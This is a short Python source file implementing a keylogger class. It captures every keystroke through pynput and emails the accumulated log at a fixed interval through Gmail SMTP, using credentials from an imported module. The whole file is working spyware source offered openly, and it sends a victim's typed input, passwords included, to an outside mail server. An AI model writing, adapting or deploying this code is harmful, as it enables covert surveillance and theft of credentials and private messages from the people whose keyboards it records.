#  Copyright (c) 2019. - ciphyr
#  Email: ciphyr[at]protonmail.com
#
#  Licensed under the Apache License, Version 2.0 (the "License");
#  You may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#  http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.

import smtplib, pynput, re, threading
import smtp_credentials

smtp_creds = smtp_credentials.SMTP_Credentials


class Keylogger:

    def __init__(self, in_report_interval, in_recipient_email):
        self.log = 'Keylogger Started. Reports sent in ' + str(in_report_interval) + 's intervals.'
        self.report_interval = in_report_interval
        self.recipient_email = in_recipient_email
        self.start()

    def send_mail(self, recipient_email, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(smtp_creds.sender_email, smtp_creds.sender_email_pass)
        server.sendmail(smtp_creds.sender_email, recipient_email, message)
        server.quit()

    def process_keypress(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if str(key) == 'Key.space':
                self.log += ' '
            else:
                key = re.search('(?:Key.)(.*)', str(key))[1]
                self.log += ' *' + str(key) + '* '

    def report(self):
        self.send_mail(self.recipient_email, self.log)
        self.log = ''
        timer = threading.Timer(self.report_interval, self.report)
        timer.start()

    def start(self):
        keyboard_Listener = pynput.keyboard.Listener(on_press=self.process_keypress)
        with keyboard_Listener:
            self.report()
            keyboard_Listener.join()
